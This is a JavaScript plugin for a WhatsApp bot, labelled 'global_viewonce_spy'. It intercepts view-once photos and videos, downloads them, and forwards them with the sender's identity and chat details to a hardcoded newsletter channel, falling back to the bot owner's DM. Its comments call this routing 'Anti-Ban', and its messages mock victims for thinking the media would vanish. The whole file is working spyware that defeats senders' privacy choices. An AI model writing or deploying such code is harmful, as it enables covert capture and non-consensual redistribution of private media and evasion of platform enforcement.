const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
const translate = require('google-translate-api-x');

// Flag to ensure startup notification only sends once per session
let startupNotified = false;

module.exports = {
    name: "global_viewonce_spy",

    trigger: (m) => {
        // Targets both V1 and V2 View-Once formats
        return m.message?.viewOnceMessage || m.message?.viewOnceMessageV2;
    },

    async onMessage(m, sock, ctx) {
        const { supabase, userSettings } = ctx;
        const style = userSettings?.style || 'harsh';
        const lang = userSettings?.lang || 'en';

        try {
            // 1. CHECK CONFIG FROM SQL
            const { data: config } = await supabase
                .from("luper_config")
                .select("is_active")
                .eq("config_key", "view_once_global_catch")
                .single();

            if (!config || !config.is_active) return;

            // 2. STYLES DEFINITION
            const modes = {
                harsh: {
                    head: "☣️ 𝖁𝕴𝕰𝖂-𝕺𝕹𝕮𝕰 𝕰𝖃𝕻𝕺𝕾𝕰𝕯 ☣️",
                    body: "☘️ 𝖄𝖔𝖚 𝖙𝖍𝖔𝖚𝖌𝖍𝖙 𝖙𝖍𝖎𝖘 𝖜𝖔𝖚𝖑𝖉 𝖛𝖆𝖓𝖎𝖘𝖍? 𝕻𝖆𝖙𝖍𝖊𝖙𝖎𝖈.",
                    startup: "🚀 𝕾𝖄𝕾𝕿𝕰𝕸 𝕷𝕴𝖁𝕰: 𝕸𝖔𝖓𝖎𝖙𝖔𝖗𝖎𝖓𝖌 𝖆𝖑𝖑 𝖘𝖊𝖈𝖗𝖊𝖙𝖘 𝖛𝖎𝖆:",
                    footer: "𝕹𝖔 𝖘𝖊𝖈𝖗𝖊𝖙𝖘 𝖆𝖑𝖑𝖔𝖜𝖊𝖉 𝖍𝖊𝖗𝖊."
                },
                normal: {
                    head: "💠 VEX View-Once Archive 💠",
                    body: "✅ Hidden media captured successfully.",
                    startup: "🚀 System Online: View-Once monitoring active on:",
                    footer: "Archived by Luper Core."
                },
                girl: {
                    head: "🫧 𝐿𝓊𝓅𝑒𝓇'𝓈 𝒫𝑒𝑒𝓀-𝒜-𝐵𝑜𝑜 🫧",
                    body: "🫧 𝐼 𝒻𝑜𝓊𝓃𝒹 𝓎𝑜𝓊𝓇 𝒽𝒾𝒹𝒹𝑒𝓃 𝓉𝓇𝑒𝒶𝓈𝓊𝓇𝑒~ 🫧",
                    startup: "🚀 𝐻𝒾 𝒷𝒶𝒷𝑒! 𝐼'𝓂 𝓃𝑜𝓌 𝓌𝒶𝓉𝒸𝒽𝒾𝓃𝑔 𝓎𝑜𝓊𝓇 𝓋𝒾𝑒𝓌-𝑜𝓃𝒸𝑒𝓈 𝑜𝓃:",
                    footer: "𝓈𝑒𝒸𝓇𝑒𝓉𝓈 𝒶𝓇𝑒𝓃'𝓉 𝒻𝓊𝓃 𝓊𝓃𝓁𝑒𝓈𝓈 𝐼 𝓈𝑒𝑒 𝓉𝒽𝑒𝓂."
                }
            };

            const current = modes[style] || modes.normal;

            // 3. STARTUP NOTIFICATION (Runs once upon script load)
            if (!startupNotified) {
                const targetChannels = [
                    { id: "120363426850850275@newsletter", name: "Tier 1: Main Newsletter" },
                    { id: sock.user.id.split(':')[0] + "@s.whatsapp.net", name: "Tier 3: Bot DM (Fallback)" }
                ];
                
                let activeTier = targetChannels[0].name; // Logic to detect active tier
                let startupMsg = `*${current.head}*\n\n${current.startup}\n📍 *${activeTier}*`;
                const { text: translatedStartup } = await translate(startupMsg, { to: lang });
                
                await sock.sendMessage(m.chat, { text: translatedStartup });
                startupNotified = true;
            }

            // 4. EXTRACT MEDIA CONTENT (V1 or V2)
            const viewOnceData = m.message.viewOnceMessage || m.message.viewOnceMessageV2;
            const type = Object.keys(viewOnceData.message)[0];
            const content = viewOnceData.message[type];

            // 5. LAZY DOWNLOAD (Only when triggered)
            const stream = await downloadContentFromMessage(content, type.replace('Message', '').toLowerCase());
            let buffer = Buffer.from([]);
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk]);
            }

            // 6. BUILD REPORT
            const sender = m.key.participant || m.key.remoteJid;
            const chatLoc = m.key.remoteJid.endsWith('@g.us') ? "Group Chat (Admins Only/Public)" : "Private Chat";
            
            let report = `*${current.head}*\n\n`;
            report += `👤 *Sender:* @${sender.split('@')[0]}\n`;
            report += `📍 *Location:* ${chatLoc}\n`;
            report += `📅 *Time:* ${new Date().toLocaleString()}\n\n`;
            report += `📝 *Note:* ${current.body}\n\n`;
            report += `_“${current.footer}”_`;

            const { text: translatedReport } = await translate(report, { to: lang });

            // 7. TIERED DISPATCH (Anti-Ban/Lazy Load)
            const dispatchTiers = ["120363426850850275@newsletter", sock.user.id.split(':')[0] + "@s.whatsapp.net"];
            
            for (const target of dispatchTiers) {
                try {
                    await sock.sendMessage(target, { 
                        [type.replace('Message', '')]: buffer, 
                        caption: translatedReport,
                        mentions: [sender]
                    });
                    break; // Success, exit tiers
                } catch (e) {
                    continue; // Try next tier
                }
            }

        } catch (error) {
            console.error("VIEW-ONCE SPY ERROR:", error);
        }
    }
};
